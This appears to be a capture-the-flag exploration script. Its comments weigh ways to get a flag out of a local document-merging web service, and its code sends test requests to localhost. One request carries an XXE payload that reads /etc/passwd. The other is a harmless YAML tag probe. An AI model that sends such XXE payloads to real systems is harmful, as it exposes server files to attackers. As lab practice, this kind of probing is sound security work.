#!/usr/bin/env python3

# Let me think about this offline first
# The challenge: we can inject arbitrary JSON structure into a DataHolder
# That structure becomes attributes on the object via pydash.set_
# Then it's merged and returned

# Key constraints:
# 1. pydash blocks __globals__, __class__, etc.
# 2. We can overwrite handlers but they must be callable
# 3. The FLAG is in os.environ

# Wait! What if we exploit the YAML handler?
# hiyapyco is a YAML library. Let me check if it has any quirks

# Actually, looking at line 34:
# def from_yaml(self, data, options={}):
#     data = self.yaml_handler.load(data + "\n", **options)

# The options parameter! If we could pass options to hiyapyco.load...
# But we can't, it's called without options from the endpoint

# Hmm, what about xmltodict? Line 43:
# data = self.xml_handler.parse(data, **options)

# xmltodict.parse() parses XML into a dict
# If XML parsing has any vulnerabilities...

# Actually wait! I just realized - what if the vulnerability is in one of the libraries themselves?
# Let me check for known CVEs in:
# - hiyapyco
# - xmltodict  
# - pydash

# Actually, let me re-read the pydash documentation more carefully
# pydash.set_ allows setting nested paths using dot notation
# The path can include integers for array indices

# What if we can somehow trigger an XXE in xmltodict?
# Or YAML deserialization in hiyapyco?

import requests

URL = "http://localhost:6969/interpol8"

# Test XXE in XML
print("=== Test: XXE in XML ===")
xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<data>&xxe;</data>
</root>"""

payload = {
    "doc1": xxe_payload,
    "doc2": '{"dummy": "data"}',
    "type1": "xml",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text[:500]}\n")

# Test YAML deserialization
print("=== Test: YAML with tags ===")
yaml_payload = "test: !!str value"

payload = {
    "doc1": yaml_payload,
    "doc2": '{"dummy": "data"}',
    "type1": "yaml",
    "type2": "json",
    "return_type": "json"
}

response = requests.post(URL, json=payload)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}\n")
